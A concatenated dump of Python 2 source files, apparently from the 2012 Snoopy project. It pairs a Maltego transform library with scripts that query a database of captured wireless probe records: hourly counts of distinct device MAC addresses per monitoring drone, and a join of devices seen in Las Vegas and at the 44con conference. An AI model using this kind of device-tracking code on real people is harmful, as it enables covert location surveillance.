                #NewEnt.addAdditionalFields("end_time","end_time", "nostrict",end)
                #NewEnt.addAdditionalFields("location","location","strict",location)
		#NewEnt.addAdditionalFields("run_id","run_id","strict",run_id)


        TRX.returnOutput()
try:    
	main()
except Exception, e:
	logging.debug(e)
                

########NEW FILE########
__FILENAME__ = Maltego
#!/usr/bin/python 
#
# This might be horrible code...
# ...but it works
# Feel free to re-write in a better way
# And if you want to - send it to us, we'll update ;)
# maltego@paterva.com (2010/10/18)
#
import sys
from xml.dom import minidom

class MaltegoEntity(object):
	value = "";
	weight = 100;
	displayInformation = "";
	additionalFields = [];
	iconURL = "";
	entityType = "Phrase"
	
	def __init__(self,eT=None,v=None):
		if (eT is not None):
			self.entityType = eT;
		if (v is not None):
			self.value = v;
		self.additionalFields = None;
		self.additionalFields = [];
		self.weight = 100;
		self.displayInformation = "";
		self.iconURL = "";
		
	def setType(self,eT=None):
		if (eT is not None):
			self.entityType = eT;
	
	def setValue(self,eV=None):
		if (eV is not None):
			self.value = eV;
		
	def setWeight(self,w=None):
		if (w is not None):
			self.weight = w;
	
	def setDisplayInformation(self,di=None):
		if (di is not None):
			self.displayInformation = di;		
			
	def addAdditionalFields(self,fieldName=None,displayName=None,matchingRule=False,value=None):
		self.additionalFields.append([fieldName,displayName,matchingRule,value]);
	
	def setIconURL(self,iU=None):
		if (iU is not None):
			self.iconURL = iU;
			
	def returnEntity(self):
		print "<Entity Type=\"" + str(self.entityType) + "\">";
		print "<Value>" + str(self.value) + "</Value>";
		print "<Weight>" + str(self.weight) + "</Weight>";
		if (self.displayInformation is not None):
			print "<DisplayInformation><Label Name=\"\" Type=\"text/html\"><![CDATA[" + str(self.displayInformation) + "]]></Label></DisplayInformation>";
		if (len(self.additionalFields) > 0):
			print "<AdditionalFields>";
			for i in range(len(self.additionalFields)):
				if (str(self.additionalFields[i][2]) <> "strict"):
					print "<Field Name=\"" + str(self.additionalFields[i][0]) + "\" DisplayName=\"" + str(self.additionalFields[i][1]) + "\">" + str(self.additionalFields[i][3]) + "</Field>";
				else:
					print "<Field MatchingRule=\"" + str(self.additionalFields[i][2]) + "\" Name=\"" + str(self.additionalFields[i][0]) + "\" DisplayName=\"" + str(self.additionalFields[i][1]) + "\">" + str(self.additionalFields[i][3]) + "</Field>";
			print "</AdditionalFields>";
		if (len(self.iconURL) > 0):
			print "<IconURL>" + self.iconURL + "</IconURL>";
		print "</Entity>";
	





class MaltegoTransform(object):
	entities = []
	exceptions = []
	UIMessages = []
	
	#def __init__(self):
		#empty.
	
	def addEntity(self,enType,enValue):
		me = MaltegoEntity(enType,enValue);
		self.addEntityToMessage(me);
		return self.entities[len(self.entities)-1];
	
	def addEntityToMessage(self,maltegoEntity):
		self.entities.append(maltegoEntity);
		
	def addUIMessage(self,message,messageType="Inform"):
		self.UIMessages.append([messageType,message]);
	
	def addException(self,exceptionString):
		self.exceptions.append(exceptionString);
		
	def throwExceptions(self):
		print "<MaltegoMessage>";
		print "<MaltegoTransformExceptionMessage>";
		print "<Exceptions>"
		
		for i in range(len(self.exceptions)):
			print "<Exception>" + self.exceptions[i] + "</Exceptions>";
		print "</Exceptions>"	
		print "</MaltegoTransformExceptionMessage>";
		print "</MaltegoMessage>";
		
	def returnOutput(self):
		print "<MaltegoMessage>";
		print "<MaltegoTransformResponseMessage>";
						
		print "<Entities>"
		for i in range(len(self.entities)):
			self.entities[i].returnEntity();
		print "</Entities>"
						
		print "<UIMessages>"
		for i in range(len(self.UIMessages)):
			print "<UIMessage MessageType=\"" + self.UIMessages[i][0] + "\">" + self.UIMessages[i][1] + "</UIMessage>";
		print "</UIMessages>"
			
		print "</MaltegoTransformResponseMessage>";
		print "</MaltegoMessage>";
		
	def writeSTDERR(self,msg):
		sys.stderr.write(str(msg));
	
	def heartbeat(self):
		self.writeSTDERR("+");
	
	def progress(self,percent):
		self.writeSTDERR("%" + str(percent));
	
	def debug(self,msg):
		self.writeSTDERR("D:" + str(msg));
			






class MaltegoMsg:

 def __init__(self,MaltegoXML=""):

    xmldoc = minidom.parseString(MaltegoXML)
    
    #read the easy stuff like value, limits etc
    self.Value = self.i_getNodeValue(xmldoc,"Value")
    self.Weight = self.i_getNodeValue(xmldoc,"Weight")
    self.Slider = self.i_getNodeAttributeValue(xmldoc,"Limits","SoftLimit")
    self.Type = self.i_getNodeAttributeValue(xmldoc,"Entity","Type")
    
    
    #read additional fields
    AdditionalFields = {}
    try:
    	AFNodes= xmldoc.getElementsByTagName("AdditionalFields")[0]
    	Settings = AFNodes.getElementsByTagName("Field")
    	for node in Settings:
    		AFName = node.attributes["Name"].value;
    		AFValue = self.i_getText(node.childNodes);
    		AdditionalFields[AFName] = AFValue
    except:  
        #sure this is not the right way...;)
    	dontcare=1
     

    #parse transform settings
    TransformSettings = {}
    try:
    	TSNodes= xmldoc.getElementsByTagName("TransformFields")[0]
    	Settings = TSNodes.getElementsByTagName("Field")
    	for node in Settings:
    		TSName = node.attributes["Name"].value;
    		TSValue = self.i_getText(node.childNodes);
        	TransformSettings[TSName] = TSValue
    except:
    	dontcare=1  
                        
    #load back into object
    self.AdditionalFields = AdditionalFields
    self.TransformSettings = TransformSettings

 def i_getText(self,nodelist):
    rc = []
    for node in nodelist:
        if node.nodeType == node.TEXT_NODE:
            rc.append(node.data)
    return ''.join(rc)


 def i_getNodeValue(self,node,Tag):
    return self.i_getText(node.getElementsByTagName(Tag)[0].childNodes)

 def i_getNodeAttributeValue(self,node,Tag,Attribute):
    return node.getElementsByTagName(Tag)[0].attributes[Attribute].value;



########NEW FILE########
__FILENAME__ = stawk_db
# -*- coding: utf-8 -*-
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

import MySQLdb
import logging
import time

dbhost="localhost"
dbuser="snoopy"
dbpass="RANDOMPASSWORDGOESHERE"
dbdb="snoopy"
retries=20

def dbconnect():
	for i in range(retries):
		try:
			# unicdoe is a whore
			db = MySQLdb.connect(dbhost, dbuser,dbpass,dbdb, use_unicode=True, charset='utf8')
			db.autocommit(True)
		except Exception,e:
			logging.error("Unable to connect to MySQL! I'll try %d more times"%(retries-i))
			logging.error(e)
			time.sleep(5)
		else:
	        	return db.cursor()


########NEW FILE########
__FILENAME__ = summary
import stawk_db
import datetime

cursor=stawk_db.dbconnect()
drones=[]

day='2012-08-24 '

st=day+'00:00:00'
fi=day+'23:59:59'
cursor.execute("SELECT monitor_id,min(timestamp),max(timestamp) FROM probes WHERE timestamp > %s AND timestamp <%s GROUP BY monitor_id", (st,fi))

for r in cursor.fetchall():
	drones.append((r[0],r[1],r[2]))

for d in drones:
	drone_id = d[0]
	print drone_id
	fp,lp=d[1],d[2]
	fp=fp - datetime.timedelta(minutes=fp.minute, seconds=fp.second)
	lp=lp - datetime.timedelta(minutes=(lp.minute-60), seconds=lp.second)

	hours=(((lp-fp)).seconds)/3600
	for h in range(hours):
		frm=fp + datetime.timedelta(hours=h)
		to=fp + datetime.timedelta(hours=h+1)
	
		cursor.execute("SELECT COUNT( DISTINCT (device_mac)) FROM probes where timestamp > %s AND timestamp < %s AND monitor_id=%s",(frm,to,drone_id))
		count=int(cursor.fetchone()[0])
		print "%s to %s = %d" %(frm.strftime("%H:%M"),to.strftime("%H:%M"),count)

########NEW FILE########
__FILENAME__ = testPy
#!/usr/bin/python
import sys
import os
from Maltego import *

sys.stderr = sys.stdout

def main():

    print "Content-type: xml\n\n";
    MaltegoXML_in = sys.stdin.read()
    if MaltegoXML_in <> '':
        m = MaltegoMsg(MaltegoXML_in)
    
        # Shows inputs in client as error message
        # Enable debug on this transform in TDS to see 
        # Comment this section to run the transform
#        print 'Type='+ m.Type +'  Value='+ m.Value + '  Weight=' + m.Weight + '  Limit=' + m.Slider
#        print '\nAdditional fields:'
#        for item in m.AdditionalFields.keys():
#            print 'N:'+item+'  V:'+m.AdditionalFields[item]
        
#        print "\nTransform settings:"
#        for item in m.TransformSettings.keys():
#            print "N:"+item+" V:"+m.TransformSettings[item]
        
#        print "\n\nXML received: \n" + MaltegoXML_in
        # Comment up to here..     
    
    
    
    
        # Start writing your transform here!                
        # This one works on Person Entity as input
        # Swaps firstname and lastname, weight of 99, adds age field
        # Needs'Age' and 'ImageURL' transform settings
        
#        Age="0"
#        if m.TransformSettings["Age"] is not None:
#            Age = m.TransformSettings["Age"]

        TRX = MaltegoTransform()
    
        Ent=TRX.addEntity("maltego.Person","doesnotmatter_its_computed")
        Ent.setWeight(99)
        Ent.addAdditionalFields("firstname","First Names","strict",m.AdditionalFields["lastname"])
        Ent.addAdditionalFields("lastname","Surname","strict",m.AdditionalFields["firstname"])
        #Ent.addAdditionalFields("Age","Age of Person","strict",Age)
        
#        if m.TransformSettings["ImageURL"] is not None:
 #           Ent.setIconURL(m.TransformSettings["ImageURL"])
        
        TRX.returnOutput()
    

##
main()
                

########NEW FILE########
__FILENAME__ = vegas44con
#!/usr/bin/python
# -*- coding: utf-8 -*-
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

import sys
import os
from Maltego import *
import stawk_db
import logging
import datetime

logging.basicConfig(level=logging.DEBUG,filename='/tmp/maltego_logs.txt',format='%(asctime)s %(levelname)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')

sys.stderr = sys.stdout

def main():

    print "Content-type: xml\n\n";
    MaltegoXML_in = sys.stdin.read()
    if MaltegoXML_in <> '':
        m = MaltegoMsg(MaltegoXML_in)
    
	cursor=stawk_db.dbconnect()
        TRX = MaltegoTransform()

#	logging.debug(m.AdditionalFields['end_time'])


	#cursor.execute("SELECT DISTINCT device_mac,vendor_short FROM probes,mac_vendor WHERE SUBSTRING(device_mac,1,6) = mac AND timestamp > %s AND timestamp < %s LIMIT 100", (start_time,end_time))
	cursor.execute("SELECT DISTINCT(t1.device_mac),t1.location,t1.monitor_id FROM probes t1 INNER JOIN probes t2 ON t1.device_mac = t2.device_mac WHERE t1.location LIKE 'vegas%' AND t2.location = '44con'")
	results=cursor.fetchall()
	logging.debug("Observed %d clients" %len(results))

	try:

		for row in results:
	       	 	mac=row[0]
        		NewEnt=TRX.addEntity("snoopy.Client", mac);
			NewEnt.addAdditionalFields("mac","mac address", "strict",row[0])
	#		NewEnt.addAdditionalFields("start_time", "start_time", "strict",start_time)
	#		NewEnt.addAdditionalFields("end_time","end_time", "strict",end_time)
        
        except Exception, e:
                logging.debug("Exception from fetchClients.py:")
                logging.debug(e)


	TRX.returnOutput()
    
main()
                

########NEW FILE########
